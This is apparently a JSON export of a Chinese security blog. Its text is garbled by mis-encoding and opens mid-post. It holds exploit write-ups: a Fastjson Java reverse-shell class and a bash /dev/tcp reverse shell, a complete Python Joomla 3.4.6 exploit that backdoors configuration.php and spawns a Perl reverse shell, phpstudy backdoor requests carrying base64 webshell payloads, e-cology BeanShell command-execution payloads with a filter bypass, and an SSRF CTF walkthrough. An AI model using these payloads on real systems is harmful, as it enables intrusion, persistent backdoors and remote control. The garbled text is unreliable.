&quot;autoCommit&quot;: true } } 5.æœåŠ¡å™¨çš„Ldapå·²æ¥æ”¶åˆ°è¯·æ±‚ï¼Œé¶æœºçš„/tmp/fastjson.testæ–‡ä»¶ä¹Ÿå·²å­˜åœ¨ï¼Œå‘½ä»¤æˆåŠŸæ‰§è¡Œ 0x05 åå¼¹shell å‘ç‚¹ä¹‹ä¸€ï¼Œjavaåå¼¹shellï¼Œæ— æ³•ç›´æ¥ä½¿ç”¨bash -i &gt;&amp; /dev/tcp/119.28.130.53/18888 0&gt;&amp;1 åå¼¹shell_Exp: import java.io.BufferedReader; import java.io.InputStream; import java.io.InputStreamReader; public class Exploit{ public Exploit() throws Exception { Process p = Runtime.getRuntime().exec(new String[]{&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/192.168.124.5/888;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;}); InputStream is = p.getInputStream(); BufferedReader reader = new BufferedReader(new InputStreamReader(is)); String line; while((line = reader.readLine()) != null) { System.out.println(line); } p.waitFor(); is.close(); reader.close(); p.destroy(); } public static void main(String[] args) throws Exception { } } 0x06 å‘ç‚¹ 1.æœªç¼–è¯‘Exploit.javaï¼Œåªæ”¾å…¥æœåŠ¡å™¨1ä¸ª.javaæ–‡ä»¶ 2.javaåå¼¹shellæ— æ³•ç›´æ¥ä½¿ç”¨linuxå‘½ä»¤åå¼¹ 3.jdkç‰ˆæœ¬éœ€è¦æ³¨æ„ï¼Œä¸‹æ–¹å›¾ç‰‡jdkç‰ˆæœ¬ä¸å­˜åœ¨æ­¤æ¼æ´ ","link":"https://www.svenbeast.com/post/c0VE5mjC-/"},{"title":"Joomla 3.4.6-RCEæ¼æ´åˆ©ç”¨","content":"0x01 èƒŒæ™¯ Joomlaæ˜¯ä¸€å¥—æ”¯æŒå¤šç§è¯­è¨€ï¼Œå…¨çƒéƒ½æœ‰åçš„CMSç³»ç»Ÿã€‚å…¶å®æ—¥å¸¸ä¹Ÿè§ä¸åˆ°ğŸ˜— è¿™æ¬¡æŠ«éœ²çš„æ˜¯Joomla 3.4.6ç‰ˆæœ¬ï¼Œæœ€æ–°ç‰ˆæœ¬ç›®å‰æ˜¯3.9.12 0x02 æ­å»ºç¯å¢ƒ ä¸‹è½½åœ°å€ï¼šhttps://github.com/joomla/joomla-cms/releases/download/3.4.6/Joomla_3.4.6-Stable-Full_Package.zip è®©æˆ‘ä»¬æ¥ä½¿ç”¨phpstudy_proæ¥æ­å»ºç¯å¢ƒå§ğŸ™ƒï¼Œè¿™æ¬¡ä¸ä¼šå†æœ‰åé—¨äº†å§ 0x03 getshell å·²ç»æœ‰æˆå‹expäº†ï¼Œè®©æˆ‘ä»¬ç›´æ¥ä¸Šæ‰‹å§ï¼ŒæˆåŠŸgetshell å®ƒä¼šåœ¨configuration.phpæ–‡ä»¶ä¸­å†™å…¥ä¸€å¥è¯ï¼Œå¯†ç ä¸ºvchvnalfdvnrrogormraprcrclduahcmjsyclppxegutxrjhog 0x04 exp ä¸€ä½å¸ˆå‚…å·²ç»å†™å¥½çš„ï¼Œæˆ‘æ¬è¿‡æ¥çš„ usage:python3 rce.py -t http://127.0.0.1 -e #!/usr/bin/env python3 import requests from bs4 import BeautifulSoup import sys import string import random import argparse from termcolor import colored PROXS = {'http':'127.0.0.1/Joomla_3.4.6'} PROXS = {} def random_string(stringLength): letters = string.ascii_lowercase return ''.join(random.choice(letters) for i in range(stringLength)) backdoor_param = random_string(50) def print_info(str): print(colored(&quot;[*] &quot; + str,&quot;cyan&quot;)) def print_ok(str): print(colored(&quot;[+] &quot;+ str,&quot;green&quot;)) def print_error(str): print(colored(&quot;[-] &quot;+ str,&quot;red&quot;)) def print_warning(str): print(colored(&quot;[!!] &quot; + str,&quot;yellow&quot;)) def get_token(url, cook): token = '' resp = requests.get(url, cookies=cook, proxies = PROXS) html = BeautifulSoup(resp.text,'html.parser') # csrf token is the last input for v in html.find_all('input'): csrf = v csrf = csrf.get('name') return csrf def get_error(url, cook): resp = requests.get(url, cookies = cook, proxies = PROXS) if 'Failed to decode session object' in resp.text: #print(resp.text) return False #print(resp.text) return True def get_cook(url): resp = requests.get(url, proxies=PROXS) #print(resp.cookies) return resp.cookies def gen_pay(function, command): # Generate the payload for call_user_func('FUNCTION','COMMAND') template = 's:11:&quot;maonnalezzo&quot;:O:21:&quot;JDatabaseDriverMysqli&quot;:3:{s:4:&quot;\\\\0\\\\0\\\\0a&quot;;O:17:&quot;JSimplepieFactory&quot;:0:{}s:21:&quot;\\\\0\\\\0\\\\0disconnectHandlers&quot;;a:1:{i:0;a:2:{i:0;O:9:&quot;SimplePie&quot;:5:{s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:{}s:5:&quot;cache&quot;;b:1;s:19:&quot;cache_name_function&quot;;s:FUNC_LEN:&quot;FUNC_NAME&quot;;s:10:&quot;javascript&quot;;i:9999;s:8:&quot;feed_url&quot;;s:LENGTH:&quot;PAYLOAD&quot;;}i:1;s:4:&quot;init&quot;;}}s:13:&quot;\\\\0\\\\0\\\\0connection&quot;;i:1;}' #payload = command + ' || $a=\\'http://wtf\\';' payload = 'http://l4m3rz.l337/;' + command # Following payload will append an eval() at the enabled of the configuration file #payload = 'file_put_contents(\\'configuration.php\\',\\'if(isset($_POST[\\\\\\'test\\\\\\'])) eval($_POST[\\\\\\'test\\\\\\']);\\', FILE_APPEND) || $a=\\'http://wtf\\';' function_len = len(function) final = template.replace('PAYLOAD',payload).replace('LENGTH', str(len(payload))).replace('FUNC_NAME', function).replace('FUNC_LEN', str(len(function))) return final def make_req(url , object_payload): # just make a req with object print_info('Getting Session Cookie ..') cook = get_cook(url) print_info('Getting CSRF Token ..') csrf = get_token( url, cook) user_payload = '\\\\0\\\\0\\\\0' * 9 padding = 'AAA' # It will land at this padding working_test_obj = 's:1:&quot;A&quot;:O:18:&quot;PHPObjectInjection&quot;:1:{s:6:&quot;inject&quot;;s:10:&quot;phpinfo();&quot;;}' clean_object = 'A&quot;;s:5:&quot;field&quot;;s:10:&quot;AAAAABBBBB' # working good without bad effects inj_object = '&quot;;' inj_object += object_payload inj_object += 's:6:&quot;return&quot;;s:102:' # end the object with the 'return' part password_payload = padding + inj_object params = { 'username': user_payload, 'password': password_payload, 'option':'com_users', 'task':'user.login', csrf :'1' } print_info('Sending request ..') resp = requests.post(url, proxies = PROXS, cookies = cook,data=params) return resp.text def get_backdoor_pay(): # This payload will backdoor the the configuration .PHP with an eval on POST request function = 'assert' template = 's:11:&quot;maonnalezzo&quot;:O:21:&quot;JDatabaseDriverMysqli&quot;:3:{s:4:&quot;\\\\0\\\\0\\\\0a&quot;;O:17:&quot;JSimplepieFactory&quot;:0:{}s:21:&quot;\\\\0\\\\0\\\\0disconnectHandlers&quot;;a:1:{i:0;a:2:{i:0;O:9:&quot;SimplePie&quot;:5:{s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:{}s:5:&quot;cache&quot;;b:1;s:19:&quot;cache_name_function&quot;;s:FUNC_LEN:&quot;FUNC_NAME&quot;;s:10:&quot;javascript&quot;;i:9999;s:8:&quot;feed_url&quot;;s:LENGTH:&quot;PAYLOAD&quot;;}i:1;s:4:&quot;init&quot;;}}s:13:&quot;\\\\0\\\\0\\\\0connection&quot;;i:1;}' # payload = command + ' || $a=\\'http://wtf\\';' # Following payload will append an eval() at the enabled of the configuration file payload = 'file_put_contents(\\'configuration.php\\',\\'if(isset($_POST[\\\\\\'' + backdoor_param +'\\\\\\'])) eval($_POST[\\\\\\''+backdoor_param+'\\\\\\']);\\', FILE_APPEND) || $a=\\'http://wtf\\';' function_len = len(function) final = template.replace('PAYLOAD',payload).replace('LENGTH', str(len(payload))).replace('FUNC_NAME', function).replace('FUNC_LEN', str(len(function))) return final def check(url): check_string = random_string(20) target_url = url + 'index.php/component/users' html = make_req(url, gen_pay('print_r',check_string)) if check_string in html: return True else: return False def ping_backdoor(url,param_name): res = requests.post(url + '/configuration.php', data={param_name:'echo \\'PWNED\\';'}, proxies = PROXS) if 'PWNED' in res.text: return True return False def execute_backdoor(url, payload_code): # Execute PHP code from the backdoor res = requests.post(url + '/configuration.php', data={backdoor_param:payload_code}, proxies = PROXS) print(res.text) def exploit(url, lhost, lport): # Exploit the target # Default exploitation will append en eval function at the end of the configuration.pphp # as a bacdoor. btq if you do not want this use the funcction get_pay('php_function','parameters') # e.g. get_payload('system','rm -rf /') # First check that the backdoor has not been already implanted target_url = url + 'index.php/component/users' make_req(target_url, get_backdoor_pay()) if ping_backdoor(url, backdoor_param): print_ok('Backdoor implanted, eval your code at ' + url + '/configuration.php in a POST with ' + backdoor_param) print_info('Now it\\'s time to reverse, trying with a system + perl') execute_backdoor(url, 'system(\\'perl -e \\\\\\'use Socket;$i=&quot;'+ lhost +'&quot;;$p='+ str(lport) +';socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};\\\\\\'\\');') if __name__ == '__main__': parser = argparse.ArgumentParser() parser.add_argument('-t','--target',required=True,help='Joomla Target') parser.add_argument('-c','--check', default=False, action='store_true', required=False,help='Check only') parser.add_argument('-e','--exploit',default=False,action='store_true',help='Check and exploit') parser.add_argument('-l','--lhost', required='--exploit' in sys.argv, help='Listener IP') parser.add_argument('-p','--lport', required='--exploit' in sys.argv, help='Listener port') args = vars(parser.parse_args()) url = args['target'] if(check(url)): print_ok('Vulnerable') if args['exploit']: exploit(url, args['lhost'], args['lport']) else: print_info('Use --exploit to exploit it') else: print_error('Seems NOT Vulnerable ;/') ","link":"https://www.svenbeast.com/post/WH877Va6k/"},{"title":"phpstudyåé—¨åˆ©ç”¨æ–¹æ³•åŠgetshell","content":"0x01 phpstudyåˆ©ç”¨æ–¹æ³• è¯·æ±‚ä»»æ„åç¼€ä¸ºphpçš„æ–‡ä»¶ ç›®æ ‡ç¯å¢ƒä¸ºphp5.2,5.4,ä¸”ä¸èƒ½ä¸ºnts å­˜åœ¨Accept-Encoding: gzip,deflate æ­¤å¤„å¡«å†™base64åŠ å¯†åçš„payloadï¼šaccept-charset: c3lzdGVtKCdjYWxjLmV4ZScpOw GET /phpinfo.php HTTP/1.1 Host: 192.168.1.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Edg/77.0.235.27 Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3 Sec-Fetch-Site: none, accept-charset: c3lzdGVtKCdjYWxjLmV4ZScpOw Accept-Encoding: gzip,deflate Accept-Language: zh-CN,zh;q=0.9 0x02 getshell è¿œç¨‹è¿æ¥ system('echo ^&lt;?php @eval($_POST[&quot;shell&quot;])?^&gt;&gt;PHPTutorial\\WWW\\shell.php'); â†“ c3lzdGVtKCdlY2hvIF48P3BocCBAZXZhbCgkX1BPU1RbInNoZWxsIl0pP14+PlBIUFR1dG9yaWFsXFdXV1xzaGVsbC5waHAnKTs= GET /phpinfo.php HTTP/1.1 Host: 192.168.1.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Edg/77.0.235.27 Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3 Sec-Fetch-Site: none, accept-charset: c3lzdGVtKCdlY2hvIF48P3BocCBAZXZhbCgkX1BPU1RbInNoZWxsIl0pP14+PlBIUFR1dG9yaWFsXFdXV1xzaGVsbC5waHAnKTs= Accept-Encoding: gzip,deflate Accept-Language: zh-CN,zh;q=0.9 0x03 æ— æ–‡ä»¶è½åœ°getshell åˆ©ç”¨phpstudyçš„åé—¨å®ç°æ— æ–‡ä»¶è½åœ°èšå‰‘getshellï¼Œä½†æœ‰æ—¶ä¼šä¸æˆåŠŸï¼Œè®¾ç½®å®Œæ¯•åè¿æ¥å³å¯ 0x04 å¯èƒ½ä¼šé‡åˆ°çš„é—®é¢˜ è‹¥æ— æ³•æˆåŠŸè¿æ¥ï¼Œå¯èƒ½ç”Ÿæˆç›®å½•ä¸å¯¹ï¼Œæ‰§è¡Œå‘½ä»¤tree /fæŸ¥çœ‹æ–‡ä»¶æ ‘ï¼Œæ‰¾åˆ°å¯è®¿é—®è·¯å¾„ç”Ÿæˆshell GET /phpinfo.php HTTP/1.1 Host: 192.168.1.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Edg/77.0.235.27 Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3 Sec-Fetch-Site: none, accept-charset: c3lzdGVtKCd0cmVlIC9mJyk7 Accept-Encoding: gzip,deflate Accept-Language: zh-CN,zh;q=0.9 ","link":"https://www.svenbeast.com/post/2OBQlt_Ta/"},{"title":"æ³›å¾®e-cology OA Beanshellç»„ä»¶è¿œç¨‹ä»£ç æ‰§è¡Œ(å¤ç°åŠPOC)","content":"0x01 è®¿é—®æœªæˆæƒè®¿é—®é¡µé¢ http://oa.xxxx.com/weaver/bsh.servlet.BshServlet 0x02 è¾“å…¥payload exec(&quot;whoami&quot;); è¾“å…¥å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼Œä¼ å…¥cmdå‘½ä»¤ï¼ŒæŸ¥çœ‹å›æ˜¾æ˜¯å¦æˆåŠŸæ‰§è¡Œ 0x03 å°†execè¿›è¡ŒUnicodeç¼–ç ç»•è¿‡éƒ¨åˆ†ç«™ç‚¹execè¿‡æ»¤ \\u0065\\u0078\\u0065\\u0063(&quot;whoami&quot;); PSï¼šhttps://github.com/jas502n/e-cology å°‘å®‡å¸ˆå‚…çš„POCåœ°å€ï¼ŒåæœŸæ‰¹é‡æœ‰æ—¶é—´å°±å†™ï¼Œç°åœ¨70å‘¨å¹´å›½åº†èŠ‚ï¼Œæœ‰ç‚¹å¿™ã€‚ ","link":"https://www.svenbeast.com/post/9rcdl83tA/"},{"title":"Shiro<=1.2.4ååºåˆ—åŒ–çš„ç®€å•ç†è§£åŠPOC","content":"0x01. ç¼˜æ•… ç”²æ–¹æ›äº†ä¸€ä¸ªshiroååºåˆ—åŒ–ï¼Œåœ¨éªŒè¯çš„æ—¶å€™å°±å¤šäº†è§£äº†ä¸€ä¸‹è¿™ä¸ªæ¼æ´ï¼Œæµ‹è¯•æ—¶ä¹Ÿæ˜¯ç”¨äº†å¸‚é¢ä¸Šæµä¼ çš„pocéªŒè¯äº†ä¸€ä¸‹ï¼Œä¸è¿‡å¹¶ä¸ç†æƒ³ï¼Œåæ¥å®é™…äº†è§£åï¼Œå‘ç°åŸå› æ˜¯ä½¿ç”¨çš„ç¼–ç ä¸å¤Ÿå¤šï¼Œæ•…ç»§ç»­é€ è½®å­ï¼Œç”±æ­¤å‡ºæ­¤ç¯‡æ–‡ç« ï¼Œä¸»è¦ç›®çš„å°±æ˜¯å‘ä¸ªè½®å­ï¼ˆ-.-! ï¼Œæ¯•ç«Ÿæœ‰ç‚¹é¸½~ï¼‰ã€‚ 0x02.ç®€å•shiro&lt;=1.2.4æ–‡å­—ç†è§£ å› ä¸ºshiroå¯¹cookieé‡Œçš„remembermeå­—æ®µè¿›è¡Œäº†ååºåˆ—åŒ–ï¼Œæ‰€ä»¥å¦‚æœçŸ¥é“äº†shiroçš„ç¼–ç æ–¹å¼ï¼Œç„¶åå°†æ¶æ„å‘½ä»¤ç”¨å®ƒçš„ç¼–ç æ–¹å¼è¿›è¡Œç¼–ç å¹¶æ”¾åœ¨httpå¤´çš„cookieé‡Œï¼Œåœ¨shiroå¯¹æäº¤çš„cookieçš„remembermeå­—æ®µè¿›è¡Œååºåˆ—åŒ–æ—¶ï¼Œä¹Ÿå°±æ‰§è¡Œäº†æ’å…¥çš„å‘½ä»¤ï¼Œæœ€ç»ˆé€ æˆäº†å‘½ä»¤æ‰§è¡Œ æˆ‘è¯´çš„æ¯”è¾ƒç®€å•å¥½ç†è§£ï¼Œå®é™…ä»£ç æµç¨‹å¾ˆå¤šå¸–å­æœ‰ï¼Œä¸æ˜¯åšä»£ç åˆ†æçš„äº†è§£åˆ°è¿™é‡Œå°±æ²¡é—®é¢˜ï¼Œé€ è½®å­çš„è¯å¤Ÿäº† 0x03. POC è¿™ä¸ªæ‰æ˜¯å‘è¿™ç¯‡æ–‡ç« çš„æœ€ç»ˆåŸå› ï¼Œæ¯•ç«Ÿé€ äº†è½®å­ä¸å‘å‡ºæ¥æ²¡äººåˆ†äº«å¤šæ²¡æ„æ€ï¼Œå€Ÿé‰´äº†weblogicscançš„pocæ¡†æ¶ï¼Œè¡¨ç¤ºè°¢è°¢ æµ‹è¯•æ—¶å‘ç°å¸‚é¢ä¸Šå¤§éƒ¨åˆ†çš„pocé›†æˆçš„ç¼–ç å’Œä½¿ç”¨çš„ysoserialé‡Œçš„ç±»åªæœ‰1-2ç§ï¼Œæ•…æ”¶é›†äº†githubä¸Šå¤§éƒ¨åˆ†çš„ç¼–ç ï¼Œå…±18ç§ï¼Œå…¶å®è¿˜æœ‰ä¸¤ç§ä¸è¿‡å‘ç°æ— æ³•ä½¿ç”¨ä¾¿åœ¨ä»£ç ä¸­æ³¨é‡Šæ‰äº†ï¼Œä¹Ÿé›†æˆäº†ysoserialé‡Œçš„7ä¸ªç±»ï¼Œæˆ‘æŠŠè¿™ä¸ªå°±ç§°ä¸º7ä¸ªæ¨¡å—æ‹‰ æ‰€ä»¥è¿™ä¸ªPOCé…åˆdnslogå¹³å°éªŒè¯æ¼æ´æ˜¯å¦å­˜åœ¨å¯¹æˆ‘æ¥è¯´æ˜¯ä¸ªç¥å™¨ï¼Œå¦‚æœå½“åšexpä½¿ç”¨è™½å¯ä»¥ä½†è¾ƒä¸ºæµªè´¹æ—¶é—´ï¼Œä¸è¿‡æˆ‘ç›¸ä¿¡å¯¹å¤§éƒ¨åˆ†äººæ¥è¯´ï¼Œè¯æ˜å­˜åœ¨æ¼æ´åï¼Œè¿›ä¸€æ­¥åˆ©ç”¨å°±æ›´ä¸ºæœ‰åŠ¨åŠ›äº†ï¼Œä¼šæœ‰å¹²åŠ²å»æƒ³åŠæ³•çš„ PS:è§£å‹å¯†ç :svenbeast é“¾æ¥: https://pan.baidu.com/s/1x776TO4yiNhqSMKnRYpWRwï¼ˆå·²å¤±æ•ˆï¼‰ æå–ç : dzeb Github:https://github.com/sv3nbeast/ShiroScan,è¯·å¸®å¿™ç‚¹ä¸ªstarï¼Œè°¢è°¢ğŸ˜˜ ","link":"https://www.svenbeast.com/post/fkOpKjach/"},{"title":"å¥‡å®‰ä¿¡å†…æ¨ç ","content":"æœ¬äººå†…æ¨ç ï¼Œä»…ä¾›åº”å±Šç”Ÿä½¿ç”¨å“¦ï¼šrwCPse69 æœ‰é—®é¢˜çš„è¯å¯ä»¥åœ¨åšå®¢ç•™è¨€ï¼Œæˆ‘çœ‹åˆ°ä¼šå›å¤ å¥‡å®‰ä¿¡æ ¡æ‹›æŠ¥ååœ°å€ï¼šhttp://campus.chinahr.com/views/qianxin/seminar.html# ","link":"https://www.svenbeast.com/post/SBIMn8jWq1/"},{"title":"ä¸€ä¸ªç¥ç§˜çš„å…¥ç¾¤é¢˜è§£é¢˜è¿‡ç¨‹","content":"Alert 1 å¼•è¨€ ç¾¤æ—©å°±åŠ äº†ï¼Œä½†æ˜¯å› ä¸ºä¸€æ¬¡ç¨€é‡Œç³Šæ¶‚çš„äº‹æƒ…è®¤è¯†ä¸€ä¸ªå¸…æ°”çš„å¸ˆå‚…ï¼Œç„¶åç¨€é‡Œç³Šæ¶‚çš„å°±æ˜¯æœ‰ä¸ªæœ‹å‹ä¹Ÿæƒ³è¿›ç¾¤ã€‚ ç„¶åæœ‹å‹ç¨€é‡Œç³Šæ¶‚çš„è®©æˆ‘å¸®å¥¹åšä¸€ä¸‹å…¥ç¾¤é¢˜ï¼Œå¥½å§ï¼Œå’³å’³ï¼Œæœ‹å‹è¿˜åœ¨æˆé•¿è¿‡ç¨‹ä¸­ï¼Œæˆ‘å¸®ä¸€ä¸‹é¡ºä¾¿å†™ä¸‹æ¥å¸®å¥¹ç†è§£ä¸€ä¸‹ï¼Œæ‰€ä»¥æˆ‘å°½é‡å†™å¾—æ¸…æ¥šæ˜ç™½çš„ä»¤äººå‘æŒ‡~ å¼€å§‹å›é¡¾ Alert 2 ç»•è¿‡è¿‡æ»¤å¾—åˆ°SSRF è®¿é—®ç›®æ ‡ç«™ç‚¹å¾—åˆ°æºç (è·Ÿç€æˆ‘æ ‡è®°çš„åºå·ç†è§£æºç ) æºç è§£æï¼ˆå¼€å¤´åºå·åœ¨åº•éƒ¨ï¼‰ï¼š &lt;?php highlight_file(__FILE__); function check_inner_ip($url) //7.æ–¹æ³•åœ¨è¿™é‡Œï¼Œæ¥æ”¶äº†urlå‚æ•° { //8.ç”¨äº†ä¸ªæ­£åˆ™è¡¨è¾¾å¼åˆ¤ä¼ æ¥çš„urlå€¼é‡Œé¢æ˜¯å¦å­˜åœ¨ $match_result=preg_match('/^(http|https|gopher|dict)?:\\/\\/.*(\\/)?.*$/',$url); if (!$match_result) //9.ä»–è®¾å®šçš„å€¼ï¼Œå­˜åœ¨è¿”å›trueçœŸï¼Œä¸å­˜åœ¨è¿”å›falseå‡ { //10. !ä»£è¡¨false,æœ‰å¥è¯è¯´çš„æ˜¯ï¼Œå‡çœŸä¸ºå‡ï¼Œå‡å‡ä¸ºçœŸ die('url fomat error'); //11.å¦‚æœåºå·8é‚£æ­¥åˆ¤æ–­é‡Œé¢ä¸å­˜åœ¨è®¾å®šçš„å€¼åˆ™è¾“ //12. å‡ºurl fomat errorè¿™ä¸ªæ¥ï¼Œç„¶åä»£ç åœæ­¢è¿è¡Œ } try //13.ä¸Šé¢çš„ifå¦‚æœæ¡ä»¶ä¸æ»¡è¶³(å› ä¸ºdieï¼Œå¦‚æœæ»¡è¶³åè„šæœ¬å°±åœæ­¢ //14. è¿è¡Œäº†)ï¼Œé‚£ä¹ˆåˆ°äº†è¿™é‡Œç»§ç»­å‘ä¸‹æ‰§è¡Œ { $url_parse=parse_url($url); //15. è¿™é‡Œå¯¹urlå€¼è¿›è¡Œè§£æï¼Œå¾—åˆ°ä»–çš„ç»„æˆéƒ¨åˆ† } //16.æ¯”å¦‚ä»–çš„host,portè¿™äº› ï¼Œå­˜åˆ°url_parseé‡Œ //17.https://www.cnblogs.com/gengyi/p/6390084.html,parse_urlå‡½æ•°ä»‹ç» catch(Exception $e) { //18.https://www.w3school.com.cn/php/php_exception.asp,try catchç”¨ //19.æ³•ä»‹ç»ï¼Œè¿™é‡Œæ„æ€æ˜¯å¦‚æœtryé‚£æ­¥çš„è§£æå‡ºç°äº†å¼‚å¸¸ï¼Œcatchå°±ä¼šæ•æ‰åˆ° //20.å¹¶æ‰§è¡Œä»–é‡Œé¢è®¾å®šçš„ä»£ç  die('url fomat error'); //21. å¦‚æœtryè§£æå‡ºç°å¼‚å¸¸ï¼Œå°±è¾“å‡ºurl fomat errorï¼Œ return false; //22.å¹¶ä¸”åœæ­¢è¿è¡Œè„šæœ¬ } $hostname=$url_parse['host']; //22.å¦‚æœtryæ²¡å‡ºç°å¼‚å¸¸ï¼Œå°±æå–é‡Œé¢çš„host //23.(å°±æ˜¯åŸŸåæˆ–è€…IP)å­˜åˆ°hostnameé‡Œ $ip=gethostbyname($hostname); //24.å°†åŸŸåè½¬æ¢æˆipï¼Œå­˜å…¥ipé‡Œ $int_ip=ip2long($ip); //25.å¯¹ipè¿›è¡Œè½¬æ¢æˆä¾¿äºæ¯”è¾ƒçš„æ•´å‹å­˜å…¥int_ip return ip2long('127.0.0.0')&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long('10.0.0.0')&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long('172.16.0.0')&gt;&gt;20 == $int_ip&gt;&gt;20 || ip2long('192.168.0.0')&gt;&gt;16 == $int_ip&gt;&gt;16; //26. ip2long('127.0.0.0')&gt;&gt;24ç»“æœæ˜¯127ï¼Œå°±æ˜¯å–çš„ç¬¬ä¸€æ®µé‚£é‡Œ //27.è¿™é‡Œæ˜¯æŠŠè¿™4ä¸ªæ®µå’Œä¼ å…¥çš„urlå‚æ•°è½¬æ¢æˆçš„æ•´å‹å­˜å…¥çš„int_ip //28.åšä¸€ä¸ªæ¯”è¾ƒï¼Œå¦‚æœå’±ä»¬è¾“å…¥çš„æ˜¯ä»–è¯†åˆ«æˆæ˜¯è¿™4ä¸ªæ®µå†…çš„ï¼Œ //29.ä»–å°±è¿”å›true,åä¹‹ä¸ºfalseï¼Œåˆ°æ­¤è¿™ä¸ªæ–¹æ³•ç»“æŸï¼Œç»§ç»­å‘ä¸‹æ‰§è¡Œ } function safe_request_url($url) //4.æ–¹æ³•æ‰¾åˆ°åœ¨è¿™é‡Œï¼Œå¾€ä¸‹çœ‹ï¼Œæ¥å—urlå‚æ•° { if (check_inner_ip($url)) //5.å‡ºç°check_inner_ipæ–¹æ³•ï¼Œå¯¹urlå‚æ•°å¤„ç†ï¼Œæˆ‘ä»¬ //6.å»ä¸Šé¢å¯»æ‰¾è¿™ä¸ªæ–¹æ³• { //30.å¾—åˆ°äº†check_inner_ipæ–¹æ³•è¿”å›çš„trueæˆ–false echo $url.' is inner ip'; //31.å¦‚æœæ˜¯è¿”å›trueåˆ™è¾“å‡º echo $url.' is inner ip' } else //32.å¦‚æœæ˜¯è¿”å›false,ç»§ç»­å‘ä¸‹æ‰§è¡Œï¼Œè¿™ä¸ªæ‰æ˜¯å’±ä»¬æƒ³è¦çš„ { //33.ä¹Ÿå°±æ˜¯æˆ‘ä»¬æƒ³åŠæ³•è®©check_inner_ipè¿”å›falseæ˜¯è§¦å‘SSRFå…³é”® //34.åé¢æ˜¯ç”¨phpæ‰§è¡Œçš„curlæ“ä½œ:https://www.jianshu.com/p/07c4dddae43a $ch = curl_init(); //35.è®¾å®šchä¸ºå¥æŸ„ï¼Œè¿™é‡Œçš„å¥æŸ„å°±æ˜¯è°å½“äº†å¥æŸ„ï¼Œæ§åˆ¶ä»– //36.å°±èƒ½æ§åˆ¶ curlæ“ä½œï¼Œå°±æŠŠä»–å½“æˆcurl åé¢çš„-O -oè¿™äº› //37.å‘½ä»¤å§-.-!ï¼Œä»–æ˜¯ä¸€ä¸ªé€šç”¨æ¦‚å¿µï¼Œä¸æ˜¯é’ˆå¯¹phpå’Œcurlä»€ä¹ˆçš„ï¼Œç™¾åº¦æœå§ curl_setopt($ch, CURLOPT_URL, $url); //38.https://www.runoob.com/php/func-curl_setopt.htmlï¼Œcurl_setoptè¯¦è§£ curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_HEADER, 0); //39.ä¸Šé¢çš„å°±æŠŠä»–å½“æˆå¯¹curlæ“ä½œçš„å„ç§è®¾ç½®å’Œå’±ä»¬ä¼ å…¥çš„urlå‚æ•° $output = curl_exec($ch); //40.æ‰§è¡Œcurlæ“ä½œï¼Œå°†å¾—åˆ°çš„ç½‘é¡µå­˜å…¥output $result_info = curl_getinfo($ch); //41.å°†å¥æŸ„chçš„å†…å®¹ç¼–ç (content_type)ï¼Œç½‘ç»œåœ°å€(url)ï¼ŒhttpçŠ¶æ€ //42.ç (http_code)ç­‰ç­‰å¾ˆå¤šå­˜å…¥result_info if ($result_info['redirect_url']) //43.å¦‚æœé‡Œé¢æœ‰redirect_urlï¼Œå‘ä¸‹æ‰§è¡Œ { safe_request_url($result_info['redirect_url']); //44.å°†è·³è½¬çš„é¡µé¢ç”¨safe_request_urlè¿‡æ»¤ä¸€é } curl_close($ch); //45.å…³é—­curl var_dump($output); //46.å°†å¾—åˆ°çš„é¡µé¢è¾“å‡ºå‡ºæ¥ } } $url = $_GET['url']; //1.ä¼ å…¥urlå‚æ•°ï¼Œå¦‚æœå‚æ•°ä¸ä¸ºç©ºï¼Œåˆ™å°† if(!empty($url)){ //2.ä¼šæ‰§è¡Œsafe_request_urlå‡½æ•°ï¼Œå‘ä¸Šå¯»æ‰¾ safe_request_url($url); //3.safe_request_urlæ–¹æ³• } ?&gt; å¯ä»¥æ˜æ˜¾çœ‹åˆ°ä¼ å…¥urlå‚æ•°ï¼Œè¿›è¡Œæ£€æŸ¥æ“ä½œï¼Œé€šè¿‡çš„è¯å°±dumpå‡ºæ¥ï¼Œå…·ä½“çœ‹ä»£ç ä¸­çš„æ³¨é‡Šï¼Œæ’ç‰ˆå·²ç»å°½åŠ›ï¼Œå…¨æ–‡çº¯æ‰‹æ‰“ï¼Œæœ«å°¾é™„ä»¶é‡Œé¢æœ‰txtæ ¼å¼çš„ä»£ç è§£æï¼Œæœ€ç»ˆå¾—åˆ°SSRF payload: ?url=http://0.0.0.0/flag.php ?url=http://127.0.0.1./flag.php æ 